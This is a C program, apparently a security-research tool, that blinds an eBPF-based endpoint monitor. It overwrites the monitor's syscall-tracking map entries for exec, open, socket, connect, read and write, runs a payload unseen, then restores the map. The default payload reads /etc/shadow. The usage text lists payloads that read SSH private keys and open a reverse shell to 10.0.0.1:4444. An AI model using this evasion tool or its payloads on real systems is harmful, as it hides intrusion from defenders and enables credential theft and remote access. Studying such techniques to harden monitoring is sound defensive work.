#define _GNU_SOURCE
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

static const uint32_t targets[] = {
    59,
    322,
    257,
    2,
    42,
    41,
    0,
    1,
};
#define NTARGETS (sizeof(targets)/sizeof(targets[0]))

#define BPF_ATTR_SZ(f) \
    (offsetof(union bpf_attr, f) + sizeof(((union bpf_attr *)0)->f))

static int bpf_call(int cmd, union bpf_attr *a, unsigned sz)
{
    return (int)syscall(__NR_bpf, cmd, a, sz);
}

static int map_fd(uint32_t id)
{
    union bpf_attr a = {}; a.map_id = id;
    return bpf_call(BPF_MAP_GET_FD_BY_ID, &a, BPF_ATTR_SZ(map_id));
}

static int map_lookup(int fd, uint32_t key, void *val)
{
    union bpf_attr a = {};
    a.map_fd = (uint32_t)fd;
    a.key    = (uint64_t)(uintptr_t)&key;
    a.value  = (uint64_t)(uintptr_t)val;
    return bpf_call(BPF_MAP_LOOKUP_ELEM, &a, BPF_ATTR_SZ(value));
}

static int map_update(int fd, uint32_t key, const void *val)
{
    union bpf_attr a = {};
    a.map_fd = (uint32_t)fd;
    a.key    = (uint64_t)(uintptr_t)&key;
    a.value  = (uint64_t)(uintptr_t)val;
    a.flags  = BPF_ANY;
    return bpf_call(BPF_MAP_UPDATE_ELEM, &a, BPF_ATTR_SZ(flags));
}

int main(int argc, char *argv[])
{
    if (argc < 3) {
        fprintf(stderr,
            "usage: %s <isys_id> <eta_id> [-- cmd [args...]]\n"
            "\n"
            "  isys_id   BPF map id for interesting_syscalls_table\n"
            "  eta_id    BPF map id for syscall_exit_tracepoint_args\n"
            "  --        run <cmd args...> inside the blind window instead of default payload\n"
            "\nexamples:\n"
            "  %s 42 43                                           # default: cat /etc/shadow\n"
            "  %s 42 43 -- ./io_uring/file_read /etc/shadow\n"
            "  %s 42 43 -- ./io_uring/multifile_read /etc/shadow /root/.ssh/id_rsa\n"
            "  %s 42 43 -- ./edrs/uring_recon_unpriv\n"
            "  %s 42 43 -- ./io_uring/net_reverse_shell 10.0.0.1 4444\n"
            "\nrequires: root (BPF_MAP_GET_FD_BY_ID + BPF_MAP_UPDATE_ELEM)\n",
            argv[0], argv[0], argv[0], argv[0], argv[0], argv[0]);
        return 1;
    }

    char **user_cmd = NULL;
    if (argc >= 5 && strcmp(argv[3], "--") == 0)
        user_cmd = argv + 4;

    int fd_isys = map_fd((uint32_t)atoi(argv[1]));
    int fd_eta  = map_fd((uint32_t)atoi(argv[2]));
    if (fd_isys < 0) { perror("open interesting_sys"); return 1; }
    if (fd_eta  < 0) { perror("open syscall_exit_ta"); return 1; }

    uint8_t saved[NTARGETS];
    uint8_t zero = 0;

    for (size_t i = 0; i < NTARGETS; i++) {
        if (map_lookup(fd_isys, targets[i], &saved[i]) < 0) {
            fprintf(stderr, "[!] lookup syscall %u: %s\n", targets[i], strerror(errno));
            return 1;
        }
        printf("[save]  syscall %3u = %u\n", targets[i], saved[i]);
    }

    for (size_t i = 0; i < NTARGETS; i++) {
        map_update(fd_isys, targets[i], &zero);
        printf("[blind] syscall %3u\n", targets[i]);
    }
    printf("[*] blinded %zu syscalls\n\n", NTARGETS);

    if (user_cmd) {
        pid_t pid = fork();
        if (pid == 0) {
            execvp(user_cmd[0], user_cmd);
            _exit(127);
        } else if (pid > 0) {
            int st;
            waitpid(pid, &st, 0);
        } else {
            perror("fork");
        }
    } else {
        system("/bin/sh -c 'cat /etc/shadow; id; whoami'");
    }

    printf("\n[*] restoring...\n");
    for (size_t i = 0; i < NTARGETS; i++) {
        if (map_update(fd_isys, targets[i], &saved[i]) == 0)
            printf("[restore] syscall %3u -> %u\n", targets[i], saved[i]);
        else
            fprintf(stderr, "[!] restore failed syscall %u\n", targets[i]);
    }

    printf("[*] done\n");
    return 0;
}
